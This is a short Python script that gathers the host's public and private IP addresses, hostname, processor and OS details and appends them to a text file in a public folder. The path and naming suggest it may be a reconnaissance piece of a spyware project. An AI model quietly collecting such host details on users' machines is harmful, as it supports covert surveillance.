import socket
import platform
from requests import get
class ComputerInfo():
    def __init__(self):
        #self.computer_information()
        pass
    def computer_information(init):
        with open(r"C:\Users\Public\Roaming\info.text", "a") as f:
            hostname = socket.gethostname()
            IPAddr = socket.gethostbyname(hostname)
            try:
                public_ip = get("https://api.ipify.org").text
                f.write("Public IP Address: " + public_ip)

            except Exception:
                f.write("Couldn't get Public IP Address (most likely max query")

            f.write("Processor: " + (platform.processor()) + '\n')
            f.write("System: " + platform.system() + " " + platform.version() + '\n')
            f.write("Machine: " + platform.machine() + "\n")
            f.write("Hostname: " + hostname + "\n")
            f.write("Private IP Address: " + IPAddr + "\n")
            print("Xd")
#ComputerInfo()